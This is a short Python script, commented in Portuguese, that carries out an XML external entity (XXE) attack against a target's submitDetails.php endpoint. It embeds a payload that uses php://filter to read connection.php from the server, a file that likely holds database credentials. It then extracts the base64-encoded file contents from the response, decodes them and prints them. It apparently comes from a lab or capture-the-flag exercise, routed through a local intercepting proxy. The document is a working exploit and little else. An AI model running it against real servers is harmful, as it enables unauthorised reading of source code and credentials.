import requests
import sys
from rich import print
import re
import base64

requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
}

url = f"{sys.argv[1]}/submitDetails.php"

xml = """<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE email [
  	<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
	]>
	<root>
	 <name>aaa</name>
	 <tel>7777777</tel>
	 <email>&company;</email>
	 <message>aaaaaaaaaa</message>
	</root>
"""

response = requests.post(url, data=xml, headers=headers, proxies=proxies)
filter = response.text
match = re.search(r"Check your email\s+(.*?)\s+for further instructions", filter, re.DOTALL) #Filtra a parte entre "Check your email" e "for further instructions", nesse caso a code base64
if match:
    encoded_string = match.group(1) #Armazena o code base64
    base64_bytes = encoded_string.encode("ascii") #Converte o code base64 para ascii chars
    sample_string_bytes = base64.b64decode(base64_bytes) #Converte para o sitema de decode de base64
    sample_string = sample_string_bytes.decode("ascii") #Decoda os ascii chars
    print(sample_string)
else:
    print("Trecho não encontrado.")

